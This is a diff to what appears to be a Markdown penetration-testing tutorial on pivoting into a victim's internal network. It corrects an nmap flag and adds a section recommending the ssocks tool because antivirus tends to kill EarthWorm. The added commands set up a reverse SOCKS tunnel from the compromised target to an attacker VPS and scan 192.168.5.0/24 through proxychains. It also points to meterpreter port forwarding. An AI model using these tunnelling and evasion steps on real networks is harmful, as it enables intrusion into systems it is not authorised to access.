@@ -115,7 +115,7 @@ socks4 127.0.0.1 1080
 ```
 Then you can use socks proxy to scan the victim's intranet:
 ```shell
-proxychains4 nmap -sT -Pn -open 192.168.5.0/24
+proxychains4 nmap -sT -Pn --open 192.168.5.0/24
 ```
 I have tried so many times to find out all the machines in the victim's intranet but I was usually failed. It just works for few times and the process is too slow. Maybe nmap is the reason for this problem, it works well when I use proxychains to get information from other hosts within the same intranet.
 
@@ -142,6 +142,21 @@ Use proxychains to scan rest of the hosts:
 ```shell
 proxychains4 nmap -sT -Pn -open 192.168.5.0/24
 ```
+Here comes the point, most of the antivirus will treat EarthWorm as the threat to the system and it will possibly be killed.
+
+I'd like to recommend another open-source tool called ssocks.(https://github.com/tostercx/ssocks) You can build the source code by yourself.
+
+The usage is similar to EarthWorm:
+
+For your VPS:
+```shell
+rcsocks -l 1088 -p 1080 -vv
+```
+For target:
+```shell
+./rssocks -s x.x.x.x:1080 -vv
+```
+The configuration and operation of proxychains is same as previous description.
 
 If you need ports forwarding, it's also available in meterpreter: (https://www.offensive-security.com/metasploit-unleashed/portfwd/)
 ```shell
